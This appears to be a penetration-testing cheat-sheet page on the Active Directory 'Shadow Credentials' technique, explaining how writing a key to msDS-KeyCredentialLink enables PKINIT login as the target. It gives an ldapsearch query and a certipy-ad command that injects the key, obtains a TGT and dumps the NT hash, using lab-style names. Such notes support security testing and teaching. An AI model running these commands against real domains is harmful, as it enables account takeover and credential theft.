# Shadow Credentials

## <mark style="color:yellow;">**ABOUT**</mark>

<mark style="color:red;">**Shadow Credentials**</mark> is a <mark style="color:purple;">**stealthy post-exploitation persistence technique**</mark> (disclosed by _Elad Shamir_) that leverages the `msDS-KeyCredentialLink` attribute on AD objects. This attribute is used by **Windows Hello for Business** and **Azure AD Join**. When you add a **custom public key** to it, you can authenticate via **Kerberos PKINIT** using your matching private key — effectively becoming the user.

> This gives you a TGT without touching the user's password or traditional login flow.

### <mark style="color:blue;">**Requirements**</mark>

* Write access (`GenericWrite`/`GenericAll`) to target user/computer object
* **PKINIT** enabled (default in modern AD environments)
* Domain reachable over **Kerberos** (TCP/UDP 88)

### <mark style="color:blue;">**Flow**</mark>

1. Generate RSA key pair
2. Create `KeyCredential` object with public key
3. Inject the object into `msDS-KeyCredentialLink` of the target account
4. Authenticate using private key via **Kerberos PKINIT**
5. Get TGT for the target account

## <mark style="color:blue;">**LINUX**</mark>

#### **Check KeyCredential Attribute Present**

```bash
ldapsearch -H ldap://dc.militech.local -x -D 's.reed@militech.local' -w 'password123' -b 'CN=songbird,CN=Users,DC=militech,DC=local' msDS-KeyCredentialLink
```

#### **Automatic Shadow Credentials Execution**

```bash
certipy-ad shadow auto -username 's.reed@militech.local' -password 'password123' -account songbird
```

**Performs:**

* KeyCredential injection
* PKINIT auth
* TGT extraction
* NT hash dump
* Cleanup

## <mark style="color:yellow;">RESOURCES</mark>

{% embed url="https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials#shadow-credentials" %}

{% embed url="https://github.com/ly4k/Certipy/wiki/07-%E2%80%90-Post%E2%80%90Exploitation#shadow-credentials-msds-keycredentiallink" %}

{% embed url="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab" %}
